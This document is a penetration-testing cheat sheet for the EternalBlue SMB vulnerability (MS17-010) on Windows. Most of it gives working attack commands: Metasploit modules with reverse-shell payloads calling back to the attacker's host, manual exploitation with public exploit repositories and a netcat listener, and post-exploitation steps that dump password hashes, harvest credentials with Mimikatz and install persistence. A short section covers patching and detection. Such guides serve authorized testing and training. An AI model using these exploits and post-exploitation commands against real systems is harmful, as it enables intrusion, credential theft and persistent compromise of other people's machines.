# EternalBlue (MS17-010)

Critical SMB vulnerability affecting Windows systems.

## Overview

| Property | Details |
|:---------|:--------|
| **CVE** | CVE-2017-0144 |
| **MS Bulletin** | MS17-010 |
| **Affected** | Windows XP, Vista, 7, 8, 10, Server 2003-2016 |
| **Port** | 445 (SMB) |
| **Impact** | Remote Code Execution (RCE) as SYSTEM |

> [!CAUTION]
> EternalBlue can crash the target system. Use in lab environments or with explicit permission.

---

## Detection

### Nmap Script
```bash
# Check if target is vulnerable
nmap -p 445 --script=smb-vuln-ms17-010 <target>

# Alternative scripts
nmap -p 445 --script=smb-vuln* <target>
```

### Metasploit Scanner
```bash
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <target>
run
```

---

## Exploitation with Metasploit

### Windows 7/Server 2008 R2 (Most Reliable)
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target_IP>
set LHOST <your_IP>
set LPORT 4444
exploit
```

### Windows 8/10/Server 2012+ (Alternative)
```bash
use exploit/windows/smb/ms17_010_psexec
set RHOSTS <target_IP>
set LHOST <your_IP>
set SMBUser <optional>
set SMBPass <optional>
exploit
```

### Payload Options
```bash
# Default x64 Meterpreter
set payload windows/x64/meterpreter/reverse_tcp

# x86 for older systems
set payload windows/meterpreter/reverse_tcp

# Simple shell (if Meterpreter fails)
set payload windows/x64/shell_reverse_tcp
```

---

## Manual Exploitation (Python)

### Using AutoBlue
```bash
# Clone the repo
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
cd AutoBlue-MS17-010

# Check vulnerability
python eternal_checker.py <target>

# Generate shellcode
cd shellcode
./shell_prep.sh
# Enter LHOST and LPORT when prompted

# Run exploit
cd ..
python eternalblue_exploit7.py <target> shellcode/sc_x64.bin

# Set up listener first!
nc -lvnp <LPORT>
```

### Using Original zzz_exploit
```bash
# Clone
git clone https://github.com/worawit/MS17-010.git
cd MS17-010

# Check named pipes
python checker.py <target>

# Modify zzz_exploit.py with your payload
# Edit the service_exec() function or use msfvenom shellcode

python zzz_exploit.py <target> samr
```

---

## Troubleshooting

| Issue | Solution |
|:------|:---------|
| Exploit fails | Try different named pipes (samr, netlogon, lsarpc) |
| Target crashes | Use `check` command first, reduce attempts |
| Wrong architecture | Use correct payload (x86 vs x64) |
| No session | Verify LHOST is reachable from target |
| SMB signing | Signing must be disabled for exploit to work |

---

## Post-Exploitation

Once you have a Meterpreter session:

```bash
# Verify access
getuid              # Should be NT AUTHORITY\SYSTEM
sysinfo            # System information

# Dump hashes
hashdump           # SAM hashes
load kiwi          # Load Mimikatz
creds_all          # All credentials

# Persistence
run persistence -U -i 5 -p 4444 -r <your_IP>

# Migrate to stable process
migrate -N explorer.exe
```

---

## Defense / Detection

### Patching
- Apply MS17-010 patch (KB4012598 and related)
- Windows Update

### Detection Indicators
- SMB traffic with unusual `Trans2` requests
- Crashes of `lsass.exe` or system BSOD
- IDS signatures for EternalBlue

### Mitigation
```powershell
# Disable SMBv1 (PowerShell)
Set-SmbServerConfiguration -EnableSMB1Protocol $false

# Firewall block
netsh advfirewall firewall add rule dir=in action=block protocol=tcp localport=445
```

---

## Related Exploits

| Name | Description |
|:-----|:------------|
| **EternalRomance** | SMB exploit (MS17-010) |
| **EternalChampion** | SMB exploit (MS17-010) |
| **EternalSynergy** | SMB exploit (MS17-010) |
| **DoublePulsar** | Backdoor often paired with EternalBlue |
